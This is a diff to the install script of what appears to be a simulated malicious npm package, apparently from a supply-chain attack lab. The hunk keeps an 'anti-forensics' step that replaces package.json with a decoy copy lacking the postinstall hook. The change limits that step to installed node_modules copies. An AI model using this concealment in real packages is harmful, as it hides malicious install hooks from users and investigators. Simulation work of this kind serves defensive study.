@@ -65,10 +65,16 @@ try {
   });
 } catch (_) {}
 
-// Simulated anti-forensics: swap package.json to decoy without postinstall script
-try {
-  const decoy = fs.readFileSync(path.join(pkgRoot, 'package.clean.json'), 'utf8');
-  fs.writeFileSync(path.join(pkgRoot, 'package.json'), decoy, 'utf8');
-} catch (_) {
-  /* ignore */
+// Simulated anti-forensics: swap installed package.json to decoy without postinstall.
+// Never mutate the authored source under packages/plain-crypto-js-like (only node_modules copies).
+const inSourceTree =
+  pkgRoot.includes(`${path.sep}packages${path.sep}plain-crypto-js-like`) &&
+  !pkgRoot.includes(`${path.sep}node_modules${path.sep}`);
+if (!inSourceTree) {
+  try {
+    const decoy = fs.readFileSync(path.join(pkgRoot, 'package.clean.json'), 'utf8');
+    fs.writeFileSync(path.join(pkgRoot, 'package.json'), decoy, 'utf8');
+  } catch (_) {
+    /* ignore */
+  }
 }
